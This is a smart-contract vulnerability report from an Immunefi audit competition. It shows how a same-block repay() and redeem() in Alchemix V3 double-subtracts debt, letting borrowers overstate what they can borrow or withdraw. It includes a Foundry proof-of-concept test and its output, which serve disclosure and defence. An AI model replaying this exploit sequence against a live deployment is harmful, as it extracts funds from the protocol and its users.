# 57590 sc critical double counted transmuter cover in redeem allows overstated redemptions and potential over withdraw over borrow

**Submitted on Oct 27th 2025 at 11:16:27 UTC by @algiz for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57590
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

When `repay()` and `redeem()` execute in the same block, `AlchemistV3.redeem()` subtracts too much from `totalDebt` and `cumulativeEarmarked`. It reduces both the actual redeemed amount and the `coverToApplyDebt` portion, even though that cover was already accounted for earlier in `repay()`. This clears the same debt twice. The extra “forgiven” debt then propagates to every borrower’s account on their next `sync()`, making their recorded debt and earmark lower than it should be.

With artificially low debt, borrowers can withdraw more collateral or borrow more *alAssets* than they should be allowed to, which directly extracts value from the protocol and drives it toward insolvency.

## Vulnerability Details

The bug becomes exploitable when `repay()` and `redeem()` are both executed in the same block. In that case, the call to `_earmark()` inside `redeem()` returns early and does not refresh `lastTransmuterTokenBalance` to reflect the new MYT that was just transferred to the Transmuter during `repay()`. As a result, when `redeem()` runs later in the same block, it observes a higher current Transmuter balance than the stale `lastTransmuterTokenBalance`, and treats the difference as newly available “cover.” This produces a nonzero `coverToApplyDebt`, which is included in `redeemedDebtTotal`.

`redeemedDebtTotal` is then subtracted from both `totalDebt` and `cumulativeEarmarked`. The problem is that the portion of `redeemedDebtTotal` coming from `coverToApplyDebt` corresponds to debt that was already accounted for during `repay()` in the same block: that debt was already deducted from `totalDebt` and `cumulativeEarmarked` when the borrower repaid and transferred MYT to the Transmuter. Subtracting it again in `redeem()` clears the same debt twice.

```solidity
function redeem(uint256 amount) external onlyTransmuter {
        _earmark();
        ...
        // cap cover so we never consume beyond remaining earmarked
        uint256 coverToApplyDebt = amount + coverDebt > liveEarmarked ? (liveEarmarked - amount) : coverDebt;


        uint256 redeemedDebtTotal = amount + coverToApplyDebt;


       // Apply redemption weights/decay to the full amount that left the earmarked bucket
        if (liveEarmarked != 0 && redeemedDebtTotal != 0) {
            uint256 survival = ((liveEarmarked - redeemedDebtTotal) << 128) / liveEarmarked;
            _survivalAccumulator = _mulQ128(_survivalAccumulator, survival);
            _redemptionWeight += PositionDecay.WeightIncrement(redeemedDebtTotal, cumulativeEarmarked);
        }


        // earmarks are reduced by the full redeemed amount (net + cover)
        cumulativeEarmarked -= redeemedDebtTotal;


        // global borrower debt falls by the full redeemed amount
        totalDebt -= redeemedDebtTotal;

         _;
}
```

This double-clearing also feeds into the global decay variables (`_survivalAccumulator`, `_redemptionWeight`), which means the reduced debt and reduced earmark are treated as legitimate system-wide progress. On subsequent `sync()` calls, that state propagates to all borrowers. Their positions will reflect less outstanding debt, which lets them withdraw more collateral or mint more debt than they should be allowed to.

## Impact Details

The issue lets an attacker repeatedly front-run redemption claims in the same block as their own repayments to artificially erase system debt. This allows borrowers across the system to withdraw excess collateral / mint additional *alAssets* they shouldn’t be allowed to, and can leave future redeemers underpaid, pushing the protocol toward insolvency.

## References

Debt state updates during `repay()`:

* [repay()](https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L521-L526)
* [\_subDept()](https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L945)

Early return in `earmark()` - [LINK](https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L1100)

Second subtraction of `totalDebt` / `cumulativeEarmark` - \[LINK]\(<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L596-L616>]

## Proof of Concept

## Proof of Concept

1. Inject the following test into the `AlchemistV3.t.sol`:

```solidity
function testPoCRepayWithEarmarkedDebt() external {
        uint256 amount = 200e18;
        vm.startPrank(address(0xbeef));


        //1. Beef user deposits 200 tokens and borrows 100
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.deposit(amount, address(0xbeef), 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenId, 100e18, address(0xbeef));

        IERC20(address(alToken)).transfer(address(0xdad), 100e18);
        vm.stopPrank();


        //2. Dad user creates 2 redemption positions for 20 and 80 tokens respectively
        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 100e18);
        transmuterLogic.createRedemption(20e18);
        transmuterLogic.createRedemption(80e18);
        vm.stopPrank();
        
        //3. We roll time until both redemptions fully mature
        console.log("================================== State before Beef repays ==================================");
        vm.roll(block.number + 5_256_000);
        uint256 totalDebtBeforeRepay           = alchemist.totalDebt();
        uint256 cumulativeEarmarkedBeforeRepay = alchemist.cumulativeEarmarked();
        uint256 lastTransmuterBalBefore        = alchemist.lastTransmuterTokenBalance();
        uint256 transmuterYieldBalBefore       = IERC20(alchemist.myt()).balanceOf(address(transmuterLogic));

        console.log("totalDebt:                     ", totalDebtBeforeRepay );
        console.log("cumulativeEarmarked:           ", cumulativeEarmarkedBeforeRepay);
        console.log("lastTransmuterTokenBalance:    ", lastTransmuterBalBefore);
        console.log("transmuterYieldBalance:        ", transmuterYieldBalBefore);

        //4. Dad user redeems his 20 tokens in the same block, leading to second subtraction of debt/earmarked tokens, which is incorrect
        console.log("");
        console.log("================================== State after Beef repays 10 ==================================");
        console.log("");

        vm.prank(address(0xbeef));
        alchemist.repay(10e18, tokenId);
        (, uint256 debt, uint256 earmarked) = alchemist.getCDP(tokenId);
        uint256 totalDebtAfterRepay           = alchemist.totalDebt();
        uint256 cumulativeEarmarkedAfterRepay = alchemist.cumulativeEarmarked();
        uint256 lastTransmuterBalAfterRepay   = alchemist.lastTransmuterTokenBalance();
        uint256 transmuterYieldBalAfterRepay  = IERC20(alchemist.myt()).balanceOf(address(transmuterLogic));
        (uint256 maxBorrowable) = alchemist.getMaxBorrowable(tokenId);

        console.log("totalDebt:                     ", totalDebtAfterRepay);
        console.log("cumulativeEarmarked:           ", cumulativeEarmarkedAfterRepay);
        console.log("lastTransmuterTokenBalance:    ", lastTransmuterBalAfterRepay);
        console.log("transmuterYieldBalance:        ", transmuterYieldBalAfterRepay);
        console.log("position debt:                 ", debt);
        console.log("position earmarked:            ", earmarked);
        console.log("maxBorrowable:   ", maxBorrowable);

        
        console.log("");
        console.log("================================== State after Dad redeems in the same block ==================================");
        console.log("");

        // Bug occurs whenever a repay and а redeem run in the same block. The earmark() call in redeem() returns early and does not update the cumulativeEarmarked + lastTransmuterTokenBalance
        // redeem() incorrectly reduces the redeemedDebtTotal from cumulativeEarmarked / totalDebt. It should only reduce by amount. 
        // In fact, the coverToApplyDebt in redeem() is obsolete, as the Transmuter will only request the amount of tokens that need to actually be pulled out from the collateral. 
        //The coverage from the transmuter is already handled in claimRedemption(), before the redeem() call
        
        // vm.roll(block.number + 1); // uncomment to demonstrate correct accounting
        vm.startPrank(address(0xdad));

        transmuterLogic.claimRedemption(1);
        (maxBorrowable) = alchemist.getMaxBorrowable(tokenId);

        (, debt, earmarked) = alchemist.getCDP(tokenId);
        uint256 totalDebtAfterRedeem = alchemist.totalDebt();
        uint256 cumulativeEarmarkedAfterRedeem = alchemist.cumulativeEarmarked();

        // correct is 80e18, not 70e18, since 10/20 tokens from redemption 1 should be covered by the yield balance in the transmuter
        console.log("totalDebt:                     ", totalDebtAfterRedeem); 
        console.log("cumulativeEarmarked:           ", cumulativeEarmarkedAfterRedeem);
        //individual debt of each user will also be reduced for "free" due to updating weights/survival incorrectly due to the double subtraction
        console.log("position debt:                 ", debt); 
        console.log("position earmarked:            ", earmarked);
        // !!! Wrong accounting leads to free increase in maxBorrowable for the user !!!
        console.log("maxBorrowable:   ", maxBorrowable); 
    }
```

2. Run the test with the following command:

```
forge test --mt testPoCRepayWithEarmarkedDebt -vv
```

3. Output:

```
Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] testPoCRepayWithEarmarkedDebt() (gas: 3776463)
Logs:
  ================================== State before Beef repays ==================================
  totalDebt:                      100000000000000000000
  cumulativeEarmarked:            0
  lastTransmuterTokenBalance:     0
  transmuterYieldBalance:         0
  
  ================================== State after Beef repays 10 ==================================
  
  totalDebt:                      90000000000000000000
  cumulativeEarmarked:            90000000000000000000
  lastTransmuterTokenBalance:     0
  transmuterYieldBalance:         10000000000000000000
  position debt:                  90000000000000000000
  position earmarked:             90000000000000000000
  maxBorrowable:    90000000000000000018
  
  ================================== State after Dad redeems in the same block ==================================
  
  totalDebt:                      70000000000000000000
  cumulativeEarmarked:            70000000000000000000
  position debt:                  70000000000000000001
  position earmarked:             70000000000000000001
  maxBorrowable:    101000000000000000016

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.91ms (7.91ms CPU time)

Ran 1 test suite in 23.27ms (21.91ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
